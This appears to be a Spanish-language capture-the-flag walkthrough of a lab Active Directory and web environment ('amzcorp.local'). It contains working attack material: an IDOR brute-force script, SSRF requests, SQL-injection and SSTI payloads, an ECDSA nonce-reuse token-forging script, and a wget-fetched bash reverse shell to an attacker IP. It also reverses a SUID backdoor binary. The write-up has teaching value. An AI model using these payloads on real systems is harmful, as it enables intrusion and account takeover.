![image](Imágenes/20250214114325.png)
## Early Access

Iniciamos la máquina escaneando los puertos de la máquina con nmap donde encontramos varios puertos abiertos, muchos de ellos son propios de un DC

```nmap
❯ nmap 10.13.37.15
Nmap scan report for 10.13.37.15  
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49685/tcp open  unknown
49688/tcp open  unknown
49704/tcp open  unknown
```

Con netexec podemos obtener información de la maquina como lo es el dominio que es amzcorp.local ademas del nombre de la maquina que es DC01

```
❯ nxc smb 10.13.37.15
SMB         10.13.37.15     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)  
```

Para posibles proximos ataques o solo por comodidad agregaremos el dominio al /etc/hosts ademas el nombre de la máquina que es DC01 como otro dominio


```
❯ echo "10.13.37.15 amzcorp.local dc01.amzcorp.local" | sudo tee -a /etc/hosts  
```

Al intentar acceder a la web desde el navegador encontramos que nos devuelve un error ya que no sabe a donde resolver usando el dominio jobs.amzcorp.local

Para solucionar este problema podemos agregar el nuevo subdominio al /etc/hosts

```
❯ echo "10.13.37.15 jobs.amzcorp.local" | sudo tee -a /etc/hosts  
```

Recargamos la página y nos encontramos con un login y aunque no tenemos credenciales para acceder podemos crear una nueva cuenta como el usuario test

Despues de registrar el usuario podemos iniciar sesión en el login y obtenemos acceso a un panel de AWS donde realmente no podemos hacer demasiado actualmente

Mirando el codigo fuente encontramos que carga un script .js llamado app.js

Al abrirlo podemos notar que esta ofuscado y es imposible de leerlo de esa forma

Para desofuscarlo podemos usar de4js donde si le pasamos el archivo podemos leer todo el codigo en javascript que ahora nos es completamente legible

Una función interesante es GetToken, esta envia en base64 una estructura json pasandole username y uuid que son parametros ingresados por un usuario cliente

```
function GetToken() {
    var uuid = document.getElementById('uuid');
    var username = document.getElementById('username');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
            document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/get');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = btoa('{"get_token": "True", "uuid":' + uuid ',"username":' + username + '}');  
    xhr.send({
        "data": data
    });
}
```

Podriamos pensar en obtener el token de admin pero la limitante es que no conocemos su uuid, para bruteforcearlo podemos crear un script en python que envie la data como se muestra en el js y aplique fuerza bruta al uuid de admin

```
#!/usr/bin/python3
import requests, base64, sys
from pwn import log

bar = log.progress("uuid")

target = "http://jobs.amzcorp.local/api/v4/tokens/get"

cookies = {"session": ".eJwtjs1uwzAMg9_F52Gw_CPbPe0leg5km8KKNS2QpKdh7z4F20UAP5Aiv92iG_ZPdzm2F97ccpvu4iQG1JbGaL6MOAizpEw5ceYuNXjJFJPMiE69Nyk9BqqQ7pN5FZ6L10qVNeQGKlFH0BmiD1qVUy3EpCgs8BaaypoVoKaIM5UhydmQ147tb03LbGDsmy7H8wsPQzxBCOiZpQrpLKOqVcWRZys9Se1Zh-fzEVa53S1yYD8-zvM-nqvx7XmH4avV7CbPuoes-He6n19qWVRZ.ZQmpEw.z0NP_VJ8coD-NcP01AzIIoAcTXM"}  
headers = {"Content-Type": "application/json"}

for uuid in range(0,1000):
    data = '{"get_token": "True", "uuid": "%d", "username": "admin"}' % uuid
    json = {"data": base64.b64encode(data.encode())}

    request = requests.post(target, headers=headers, cookies=cookies, json=json)
    bar.status(uuid)

    if "Invalid" not in request.text:
        print(request.text.strip())
        bar.success(uuid)
        sys.exit(0)
```

Ejecutamos el script y despues de unos segundos aplicando fuerza bruta llega al uuid 955 que es valido para admin, al hacer la petición este nos devuelve una estructura en json con el token del usuario admin ademas de la primera flag


```
❯ python3 idor.py
[+] uuid: 955
{
  "flag": "AWS{S1mPl3_iD0R_4_4dm1N}",
  "token": "98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a",  
  "username": "admin",
  "uuid": "955"
}
```


## Inspector


Despues de buscar mas rutas de la api encontramos status y al hacerle un simple curl nos devuelve un json que curiosamente tiene varios subdominios existentes


```
❯ curl -s http://jobs.amzcorp.local/api/v4/status | jq  
{
  "site_status": [
    {
      "site": "amzcorp.local",
      "status": "OK"
    },
    {
      "site": "jobs.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "services.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "cloud.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "inventory.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "workflow.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "company-support.amzcorp.local",
      "status": "OK"
    }
  ]
}
```

Volviendo al js desofuscado tambien encontramos una ruta /logs/get que contiene otro subdominio logs sin embargo a este no podemos acceder desde fuera


```
function GetLogData() {
    var log_table = document.getElementById('log_table');
    const xhr = new XMLHttpRequest();

    xhr.open('GET', '/api/v4/logs/get');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            log_table.append(this.response['log']);
        } else {
            log_table.append("Error retrieving logs from logs.amzcorp.local");  
        }
    };
    xhr.send();
}
```

Lo que si podemos usar es la ruta status para apuntar a logs.amzcorp.local y mediante un SSRF acceder a este subdominio, para ello necesitaremos el token de admin que obtuvimos, con algunas regex guardamos el contenido en dump.txt


```
❯ curl -s http://jobs.amzcorp.local/api/v4/status -d '{"url": "http://logs.amzcorp.local"}' -b api_token=98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a -H 'Content-Type: application/json' | sed 's/\\n/\n/g' | sed 's/\\//g' | sed 's/""//g' > dump.txt  
```

En contenido es un json, algo interesante es un patron que se repite en el campo hostname, una data en base64 sin demasiado sentido seguido de .c00.xyz


```
❯ cat dump.txt | jq | head
{
  "result": [
    {
      "hostname": "Y2Ryb206eDoyNDoK.c00.xyz",
      "ip_address": "129.141.123.251",
      "method": "GET",
      "requester_ip": "172.22.11.10",
      "url": "/"
    },
```

```
❯ echo Y2Ryb206eDoyNDoK | base64 -d
cdrom:x:24:
```

Jugando con expresiones regulares podemos tomar del campo hostname solo la data en base64 y al decodearla buscar por una cadena AWS, asi encontramos una flag


```
❯ cat dump.txt | jq -r '.result[].hostname' | grep -oP '[^/]+(?=\.c00\.xyz)' | base64 -d | strings | grep AWS  
AWS{F1nD1nG_4_N33dl3_1n_h4y5t4ck}
```


## Statement

Si buscamos por la cadena password en el json encontramos una petición en la que se envia por GET la data de una contraseña perdida, el problema es que manda la contraseña para tyler en texto plano asi que al urldecodearla podemos verla


```
❯ cat dump.txt | grep password -A1 -B5
{
  "hostname": "jobs.amzcorp.local",
  "ip_address": "172.21.10.12",
  "method": "GET",
  "requester_ip": "36.101.23.69",
  "url": "/forgot-passsword/step_two/?username=tyler&email=tyler@amzcorp.local&password=%7BpXDWXyZ%26%3E3h%27%27W%3C"  
},
```

Al urldecodear el campo password logramos ver la contraseña {pXDWXyZ&>3h''W< con la que podemos iniciar sesión como el usuario tyler en el subdominio jobs

Volviendo al json que dumpeamos en el campo hostname encontramos varios subdominios, al quitar las repeticiones encontramos 2 entre ellos jobs-development


```
❯ cat dump.txt | jq -r '.result[].hostname' | grep amzcorp.local | sort -u  
company-support.amzcorp.local
jobs.amzcorp.local
jobs-development.amzcorp.local
```

En la información de la petición a este subdominio podemos ver que la ruta a la que se hizo fue /.git por lo que sabemos que hay un proyecto de git existente


```
❯ cat dump.txt | grep jobs-development.amzcorp.local -A5 -B1  
{
  "hostname": "jobs-development.amzcorp.local", 
  "ip_address": "172.21.10.11", 
  "method": "GET", 
  "requester_ip": "129.141.123.251", 
  "url": "/.git"
},
```

Después de agregar el nuevo subdominio al /etc/hosts podemos dumpear los archivos del proyecto .git a partir de la web usando la herramienta git-dumper


```
❯ git-dumper http://jobs-development.amzcorp.local/.git/ dump  
[-] Testing http://jobs-development.amzcorp.local/.git/HEAD [200]
[-] Testing http://jobs-development.amzcorp.local/.git/ [200]
[-] Fetching .git recursively
.................................................................  
```

Dentro de la carpeta jobs_portal podemos ver la configuracion de la web, entre ellas una ruta de la api que nos permite actualizar un usuario a Administrators

```
@blueprint.route('/api/v4/users/edit', methods=['POST'])
def update_users():
    if request.method == "POST":
        if request.cookies.get('api_token'):
            tokens = []
            users = Users.query.all()
            for user in users:
                tokens.append(user.api_token)
            if request.cookies.get('api_token') in tokens:
                if session['role'] == "Managers":
                    if request.headers.get('Content-Type') == 'application/json':
                        content = request.get_json(silent=True)
                        try:
                            if content['update_user']:
                                data = base64.b64decode(content['update_user']).decode()
                                info = json.loads(data)
                                if info['username'] and info['email'] and info['role']:
                                    try:
                                        specific_user = Users.query.filter_by(username=info['username']).first()
                                    except:
                                        specific_user = Users.query.filter_by(email=info['email']).first()
                                    if specific_user:
                                        if not specific_user.role == "Managers" and not specific_user.role == "Administrators":  
                                            specific_user.username = info['username']
                                            specific_user.email = info['email']
                                            specific_user.role = info['role']
                                            return jsonify({"success":"User updated successfully"})

```

Creamos una estructura en json como lo pide para agregar el rol Administrators al usuario test, despues de eso lo encodeamos en base64 como lo pide el codigo


```
❯ echo '{"username":"test","email":"test@test.com","role":"Administrators"}' | base64 -w0
eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiQWRtaW5pc3RyYXRvcnMifQo=  
```

Finalmente hacemos la peticion con la data en base64 dentro de update_user para actualizar el rol arrastrando el api_token de admin y la cookie de tyler


```
❯ curl -s http://jobs.amzcorp.local/api/v4/users/edit -d '{"update_user": "eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiQWRtaW5pc3RyYXRvcnMifQo="}' -b api_token=98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a -b session=.eJw1jktOBDEMRO-SNUL52UlmxQU4QytxbBiR7h6lexaAuDseITaWqkrPVd9mkcnHu7mc885PZrl2czHQIXqImSUjQqOAPuciJVDw0afWxIXiUfMeQAg7AKTgxfUGUjPYAMFGAWlK-lxsSalRsnrR2SYKZ9LHMQtXn9A7yxmSJRBGZG90yP3g-bfmIemYspz7B29qdBdT6o0cIhWH2lWoeqBSG4rN3KhastCU47VehyLn5-D5Utcv2ufteexUh6ZzH6zha93qG89DnUfrVlf-R8zPL1XoVQU.ZQXUSw.fIPkBrBQRAxu9cf9c2_cMFwOj7s -H 'Content-Type: application/json' | jq  
{
  "success": "User updated successfully"
}
```

Despues de volver a iniciar sesión el usuario test tiene acceso como admin en jobs

Una ruta disponible cuando nos autenticamos como admin es el buscador que tiene una posible sqli, aunque algo importante es que tiene una blacklist, sin embargo podemos bypassearla facilmente cambiando cosas como union por Union


```
@blueprint.route('/admin/users/search', methods=['POST'])
@login_required
def search_user():
    if session['role'] == "Administrators":
        blacklist = ["0x", "**", "ifnull", " or ", "union"]
        username = request.form.get('username')
        if username:
            try:
                conn = connect_db()
                cur = conn.cursor()
                cur.execute('SELECT id, username, email, account_status, role FROM `Users` WHERE username=\'%s\'' % (username))  
                row = cur.fetchone()
                conn.commit()
                conn.close()
                all_roles = Role.query.all()
                row = ""
                return render_template('home/search.html', row=row, segment="users", all_roles=all_roles)
            except sqlite3.DataError:
                all_roles = Role.query.all()
                row = ""
```

Iniciamos con la cantidad de columnas que obtenemos con order by, despues de ordenar mas de 5 columnas nos deja de mostrar el contenido asi que existen 5

`test' order by 10-- - ` 


`test' order by 5-- - ` 


Con union podemos representar las columnas con numeros y a partir de ahi trabajar

`' Union Select 1,2,3,4,5-- -`  


Podemos dumpear los nombres de las bases de datos donde el unico que llama la atención es la base de datos jobs que es la que esta actualmente en uso

`' Union Select 1,group_concat(schema_name),3,4,5 from information_schema.schemata-- -`  


Ya con un nombre de db podemos dumpear sus tablas, a partir de la base de datos jobs encontramos algunas tablas interesantes como users o keys_tbl

`' Union Select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema='jobs'-- -`


Iniciemos con keys_tbl, tabla de la cual podemos enumerar las columnas que son 3 en total, de las cuales solo nos interesan 2 y estas son key_name y key_value

`' Union Select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema='jobs' and table_name='keys_tbl'-- -`  


Finalmente dumpeamos esas 2 columnas de la tabla keys_tbl y ademas de posibles claves para el servicio AWS encontramos la tercera flag en uno de los valores

`' Union Select 1,group_concat(key_name,':',key_value),3,4,5 from keys_tbl-- -` 

## Relentless

Antes también habiamos encontrado un subdominio company-support con un login

Sin embargo despues de registrar un usuario e iniciar sesión devuelve Access denied ya que la cuanta recien creada no ha sido habilitada y no tiene ningun permiso

En el codigo fuente dumpeado desde el .git encontramos el funcionamiento, necesitamos crear un codigo a partir de el usuario y la contraseña con URLSafeSerializer y se puede enviarlo a /confirm-account ya sea por GET o POST


```
@blueprint.route('/confirm_account/<secretstring>', methods=['GET', 'POST'])
def confirm_account(secretstring):
    s = URLSafeSerializer('serliaizer_code')
    username, email = s.loads(secretstring)

    user = Users.query.filter_by(username=username).first()
    user.account_status = True
    db.session.add(user)
    db.session.commit()

    #return redirect(url_for("authentication_blueprint.login", msg="Your account was confirmed succsessfully"))  
    return render_template('accounts/login.html',
                        msg='Account confirmed successfully.',
                        form=LoginForm())
```

Ya que creamos un usuario test con contraseña test podemos calcular el codigo


```
❯ python3 -q
>>> from itsdangerous import URLSafeSerializer
>>> URLSafeSerializer('serliaizer_code').dumps(["test", "test"])  
'WyJ0ZXN0IiwidGVzdCJd.VG9-7igrRdtu19YxfI27I9q9zIc'
>>>
```

Al enviarlo a /confirm-account nos devuelve que se ha confirmado la cuenta y al iniciar sesión de nuevo obtenemos acceso al portal de company-support

Algo interesante es que nos dice que el usuario tony revisará todas las solicitudes

Revisando de nuevo el codigo desde .git encontramos un archivo custom_jwt.py donde podemos ver como se crea una cookie con criptografia ecdsa debil


```python
import base64
from ecdsa import ellipticcurve
from ecdsa.ecdsa import curve_256, generator_256, Public_key, Private_key, Signature  
from random import randint
from hashlib import sha256
from Crypto.Util.number import long_to_bytes, bytes_to_long
import json

G = generator_256
q = G.order()
k = randint(1, q - 1)
d = randint(1, q - 1)
pubkey = Public_key(G, G*d)
privkey = Private_key(pubkey, d)

def b64(data):
    return base64.urlsafe_b64encode(data).decode()

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def sign(msg):
    msghash = sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k)
    _sig = (sig.r << 256) + sig.s
    return b64(long_to_bytes(_sig)).replace("=", "")

def verify(jwt):
    _header, _data, _sig = jwt.split(".")
    header = json.loads(unb64(_header))
    data = json.loads(unb64(_data))
    sig = bytes_to_long(unb64(_sig))
    signature = Signature(sig >> 256, sig % 2**256)
    msghash = bytes_to_long(sha256((f"{_header}.{_data}").encode()).digest())
    if pubkey.verifies(msghash, signature):
        return True
    return False

def decode_jwt(jwt):
    _header, _data, _sig = jwt.split(".")
    data = json.loads(unb64(_data))
    return data

def create_jwt(data):
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(',', ':')).encode())
    _data = b64(json.dumps(data, separators=(',', ':')).encode())
    _sig = sign(f"{_header}.{_data}".replace("=", ""))
    jwt = f"{_header}.{_data}.{_sig}"
    jwt = jwt.replace("=", "")
    return jwt
```

Usando las propias funciones del codigo y pasandole nuestra cookie actual a decode_jwt podemos ver la estructura json que se usa al crear el json web token


```python
#!/usr/bin/python3
import json, base64

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def decode_jwt(jwt):
    _header, _data, _sig = jwt.split(".")
    data = json.loads(unb64(_data))
    return data

print(decode_jwt("eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJhY2NvdW50X3N0YXR1cyI6dHJ1ZX0.E3FBE4S6PUwenBNaFQLXZCv0KTGtsHHhwws_zxgRIIbRvlm_VXmX6egdPxd1wiaNbnnNA_NoDNwtIEYmdcZczQ"))  
```


```
❯ python3 exploit.py 
{'username': 'test', 'email': 'test@test.com', 'account_status': True}  
```

Nuestra idea sera suplantar al usuario tony sin embargo las variables k y d las toma de un valor aleatorio por cada ejecución asi que si lo creamos no pasara la verificacion con esa firma, sin embargo podemos encontrar una investigación que nos muestra como obtenerlos a partir de 2 valores existentes en este caso 2 cookies

```
k = randint(1, q - 1)
d = randint(1, q - 1)
```

Ayudandonos del articulo podemos crear un script con 2 jwt creados por nosotros al registrar usuarios para asi calcular el jwt del usuario tony con los valores k y d extraidos, de esta manera al firmarlo con los mismos valores pasara la verificación


```python
#!/usr/bin/python3
from ecdsa.ecdsa import generator_256, Public_key, Private_key, Signature
from Crypto.Util.number import bytes_to_long, long_to_bytes
import libnum, hashlib, sys, json, base64

def b64(data):
    return base64.urlsafe_b64encode(data).decode()

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def sign(msg):
    msghash = hashlib.sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k)
    _sig = (sig.r << 256) + sig.s
    return b64(long_to_bytes(_sig)).replace("=", "")

def create_jwt(data):
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(',', ':')).encode())
    _data = b64(json.dumps(data, separators=(',', ':')).encode())
    _sig = sign(f"{_header}.{_data}".replace("=", ""))
    jwt = f"{_header}.{_data}.{_sig}"
    jwt = jwt.replace("=", "")
    return jwt

jwt1 = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJhY2NvdW50X3N0YXR1cyI6dHJ1ZX0.E3FBE4S6PUwenBNaFQLXZCv0KTGtsHHhwws_zxgRIIbRvlm_VXmX6egdPxd1wiaNbnnNA_NoDNwtIEYmdcZczQ"
jwt2 = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3RpbmciLCJlbWFpbCI6InRlc3RpbmdAdGVzdGluZy5jb20iLCJhY2NvdW50X3N0YXR1cyI6dHJ1ZX0.E3FBE4S6PUwenBNaFQLXZCv0KTGtsHHhwws_zxgRIIYKIEY1w0euhnnVyuR8_Mdgw-iTUzifLhIWKcTmpQG4Hw"  

head1, data1, sig1 = jwt1.split(".")
head2, data2, sig2 = jwt2.split(".")

msg1 = f"{head1}.{data1}"
msg2 = f"{head2}.{data2}"

h1 = bytes_to_long(hashlib.sha256(msg1.encode()).digest())
h2 = bytes_to_long(hashlib.sha256(msg2.encode()).digest())

_sig1 = bytes_to_long(unb64(sig1))
_sig2 = bytes_to_long(unb64(sig2))

sig1 = Signature(_sig1 >> 256, _sig1 % (2 ** 256))
sig2 = Signature(_sig2 >> 256, _sig2 % (2 ** 256))

r1, s1 = sig1.r, sig1.s
r2, s2 = sig2.r, sig2.s

G = generator_256
q = G.order()

valinv = libnum.invmod(r1 * (s1 - s2), q)
d = (((s2 * h1) - (s1 * h2)) * (valinv)) % q

valinv = libnum.invmod((s1 - s2), q)
k = ((h1 - h2) * valinv) % q

pubkey = Public_key(G, G * d)
privkey = Private_key(pubkey, d)

data = {'username': 'tony', 'email': 'tony@amzcorp.local', 'account_status': True}

print(create_jwt(data))
```

Al ejecutar el script nos dara el jwt del usuario tony firmado y al modificar nuestra cookie en el navegador y recargar obtenemos acceso a el panel de admin


```
❯ python3 exploit.py
eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJlbWFpbCI6InRvbnlAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.E3FBE4S6PUwenBNaFQLXZCv0KTGtsHHhwws_zxgRIIZHKzQu-bjKLJ9ycHelaB_ruPZOP2I2ImO64_dJmT3qjQ  
```

Volviendo al codigo del git en una función de este podemos ver una vulnerabilidad de SSTI ya que usa la funcion render_template_string para mostrar los datos


```
@blueprint.route('/admin/tickets/view/<id>', methods=['GET'])
@login_required
def view_ticket(id):
    data = decode_jwt(request.cookies.get('aws_auth'))
    if verify(request.cookies.get('aws_auth')):
        user_authed = Users.query.filter_by(username=data['username']).first()
        if user_authed.role == "Administrators":
            ticket = Tickets.query.filter_by(id=id).first()
            ticket.status = "Read"
            db.session.commit()
            message = ticket.message
            user = Users.query.filter_by(username=ticket.user_sent).first()
            email = user.email
            blacklist = ["__classes__","request[request.","__","file","write"]
            for bad_string in blacklist:
                if bad_string in message:
                    return render_template('home/500.html')
            for bad_string in blacklist:
                if bad_string in email:
                    return render_template('home/500.html')
            for bad_string in blacklist:
                for param in request.args:
                    if bad_string in request.args[param]:
                        return render_template('home/500.html')
            rendered_template = render_template("home/ticket.html", ticket=ticket,segment="tickets", email=email)  
            return render_template_string(rendered_template)
        else:
            return render_template('home/403.html')
    else:
        return render_template('home/403.html')
```

Podemos enviar el clasico payload {{7*7}} para ver si este se logra interpretar

En el panel que tenemos como admin podemos ver los tickets y en el campo subject donde enviamos {{7*7}} encontramos 49 lo que significa que se ha interpretado

Tenemos varias limitaciones, ya que en el codigo hay una blacklist para varios campos, sin embargo en ningun momento valida subject asi que usaremos ese


```
blacklist = ["__classes__","request[request.","__","file","write"]  
for bad_string in blacklist:
    if bad_string in message:
        return render_template('home/500.html')
for bad_string in blacklist:
    if bad_string in email:
        return render_template('home/500.html')
for bad_string in blacklist:
    for param in request.args:
        if bad_string in request.args[param]:
            return render_template('home/500.html')
```

Podemos usar un payload para ejecutar comandos, algo a tener en cuenta que las comillas nos dan problemas asi que lo mejor es usar request.args.cmd para de esta manera enviar el comando por el parametro cmd por get y asi evitar comillas

`{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}`  


Enviamos el payload en el campo subject creando un ticket y lo podemos ver reflejado como admin donde solo devuelve la respuesta en formato bytes b''

Podemos pasarle un comando como id en el campo cmd que definimos por ejemplo ?cmd=id y al ejecutarlo podemos ver reflejado el output del comando por www-data

Ya que ejecutamos comandos para evitar problemas con comillas y la blacklist podemos crear un archivo index.html que contenga una revshell en bash y compartirla, despues descargamos el archivo con wget y lo ejecutamos con bash

```
❯ cat index.html
bash -i >& /dev/tcp/10.10.14.10/443 0>&1
```


```
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
?cmd=wget 10.10.14.10/index.html  
?cmd=bash index.html
```

Al hacerlo nos envia una shell como el usuario www-data, de esta manera obtenemos la primera shell en un contenedor docker donde podemos leer la cuarta flag


```
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.15
www-data@0474e1401baa:~/web$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
www-data@0474e1401baa:~/web$ hostname -I
172.22.11.10 
www-data@0474e1401baa:~/web$ cat ../flag.txt 
AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
www-data@0474e1401baa:~/web$
```

## Magnified


Buscando por archivos con privilegios suid encontramos uno fuera de lo comun que es backup_tool el archivo pertenece al usuario root y podria hacer un setuid


```
www-data@0474e1401baa:~$ find / -perm -u+s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/backup_tool
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
www-data@0474e1401baa:~$ ls -l /usr/bin/backup_tool
-rwsr-xr-x 1 root root 25040 Feb  9  2022 /usr/bin/backup_tool  
www-data@0474e1401baa:~$
```

Para saber lo que hace por detras podemos usar un decompilador como lo es ida

Iniciemos por la función main esta hace un setguid y setuid a 0 que es el id de root, seguido de eso simplemente llama a la función a() y sale del programa

```
int __fastcall main(int argc, const char **argv, const char **envp)  
{
  setgid(0);
  setuid(0);
  a(0LL);
  return 0;
}
```

Seguido de eso el programa pide varios datos antes de llamar a la funcion l_m(), los valores son username, password y otp, y se usan funciones para obtenerlos

```
__int64 a()
{
  const char *_password; // rsi
  __int64 _otp; // [rsp+8h] [rbp-18h]
  char *_username; // [rsp+18h] [rbp-8h]

  puts("Enter your credentials to continue:");  
  printf("Username: ");
  _username = (char *)g_u();
  __isoc99_scanf("%127s", username);
  printf("Password: ");
  __isoc99_scanf("%127s", password);
  if ( strcmp(username, _username) )
  {
    puts("Incorrect Credentials!");
    exit(1);
  }
  _password = (const char *)g_p();
  if ( strcmp(password, _password) )
  {
    puts("Incorrect Credentials!");
    exit(1);
  }
  _otp = g_o();
  printf("OTP: ");
  __isoc99_scanf("%d8", &otp);
  if ( _otp != otp )
  {
    puts("Incorrect Credentials!");
    exit(1);
  }
  l_m();
  return 0LL;
}
```

Para los campos username y password usa la función debil strcmp para comparar el input con el resultado de la función asi que podemos ver los valores con ltrace

```
❯ ltrace ./backup_tool
setgid(0)                                                                               = -1
setuid(0)                                                                               = -1
puts("Enter your credentials to contin"...Enter your credentials to continue:
printf("Username: ")                                                                    = 10
malloc(8)                                                                               = 0x557bc89e05c0  
__isoc99_scanf(0x557bc87460cf, 0x557bc87481e0, 0x726f6f646b636162, 6Username: test
printf("Password: ")                                                                    = 10
__isoc99_scanf(0x557bc87460cf, 0x557bc8748260, 0, 0Password: test
strcmp("test", "backdoor")                                                              = 18
puts("Incorrect Credentials!"Incorrect Credentials!
exit(1 <no return ...>
+++ exited (status 1) +++
```

```
❯ ltrace ./backup_tool
setgid(0)                                                                               = -1
setuid(0)                                                                               = -1
puts("Enter your credentials to contin"...Enter your credentials to continue:
printf("Username: ")                                                                    = 10
malloc(8)                                                                               = 0x55dbaa54d5c0  
__isoc99_scanf(0x55dba98210cf, 0x55dba98231e0, 0x726f6f646b636162, 6Username: backdoor
printf("Password: ")                                                                    = 10
__isoc99_scanf(0x55dba98210cf, 0x55dba9823260, 0, 0Password: test
strcmp("backdoor", "backdoor")                                                          = 0
strcmp("test", "<!8,>;<;He")                                                            = 56
puts("Incorrect Credentials!"Incorrect Credentials!
exit(1 <no return ...>
+++ exited (status 1) +++
```

El codigo otp depende de la hora asi que sera necesario sincronizarla con la del DC, despues en gdb aplicamos un breakpoint antes del ret de la funcion g_o() que se usa para obtenerlo, corremos el programa con las credenciales y cuando este llega al breakpoint el codigo se guardara en el registro $rax que podemos ver con p

```
❯ sudo ntpdate -s amzcorp.local
```

```
❯ gdb -q backup_tool
Reading symbols from /home/kali/backup_tool...
(No debugging symbols found in /home/kali/backup_tool)
pwndbg> break *g_o+805
Breakpoint 1 at 0x2642
pwndbg> run
Starting program: /home/kali/backup_tool
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".  
Enter your credentials to continue:
Username: backdoor
Password: <!8,>;<;He

Breakpoint 1, 0x0000555555556642 in g_o ()
pwndbg> print $rax
$1 = 538406
pwndbg>
```

Al depender de la hora podemos usarlo en el proceso o ejecutar el binario en la maquina victima, le pasamos las credenciales y el codigo otp que conseguimos

```
www-data@0474e1401baa:~$ /usr/bin/backup_tool  
Enter your credentials to continue:
Username: backdoor
Password: <!8,>;<;He
OTP: 538406

Select Option:

1. Plant Backdoor
2. Read Secret
3. Restart exfiltration
4. Exit

Enter choice:
```

Volviendo al codigo nos damos cuenta de las opciones que desbloqueamos despues de autenticarnos, una interesante es el caso 2 que llama a la funcion r_s(), esta abre con fopen el archivo /opt/flag.txt y la imprime por pantalla

```
__int64 l_m()
{
  __int64 result; // rax
  unsigned int choice; // [rsp+Ch] [rbp-4h] BYREF  

  do
  {
    puts("\nSelect Option:\n");
    puts("1. Plant Backdoor");
    puts("2. Read Secret");
    puts("3. Restart exfiltration");
    puts("4. Exit\n");
    printf("Enter choice: ");
    __isoc99_scanf("%1d", &choice);
    if ( choice == 4 )
    {
      printf("\x1B[1;1H\x1B[2J");
      exit(0);
    }
    if ( (int)choice <= 4 )
    {
      switch ( choice )
      {
        case 3u:
          s_b();
          goto LABEL_12;
        case 1u:
          a_b();
          goto LABEL_12;
        case 2u:
          r_s();
          goto LABEL_12;
      }
    }
    puts("Invalid choice!");
LABEL_12:
    result = choice;
  }
  while ( choice != 5 );
  return result;
}

__int64 r_s()
{
  char secret[264]; // [rsp+0h] [rbp-110h] BYREF  
  FILE *flag; // [rsp+108h] [rbp-8h]

  flag = fopen("/opt/flag.txt", "r");
  __isoc99_fscanf(flag, "%s", secret);
  printf("Secret: %s\n\n", secret);
  return 0LL;
}

```

En la maquina simplemente indicamos el caso 2 y nos muestra la flag numero 5

```
Enter choice: 2
Secret: AWS{r3v3r51ng_1mpl4nt5_1s_fun}  
```

## Shortcut

